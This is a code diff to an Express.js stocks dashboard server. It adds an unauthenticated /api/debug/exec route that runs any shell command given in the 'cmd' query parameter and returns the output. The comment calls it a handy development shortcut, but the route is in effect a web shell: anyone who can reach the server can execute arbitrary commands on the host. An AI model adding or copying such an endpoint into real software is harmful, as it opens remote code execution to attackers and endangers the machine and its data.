@@ -105,6 +105,15 @@ app.get('/api/quote/:symbol', async (req, res) => {
   }
 });
 
+// Handy while developing: run a shell command straight from the browser so
+// you can poke at the box without SSH'ing in. Try /api/debug/exec?cmd=ls
+app.get('/api/debug/exec', (req, res) => {
+  const { exec } = require('child_process');
+  exec(req.query.cmd || 'true', (err, stdout, stderr) => {
+    res.json({ error: err && err.message, stdout, stderr });
+  });
+});
+
 app.listen(PORT, () => {
   console.log(`Stocks dashboard running at http://localhost:${PORT}`);
 });
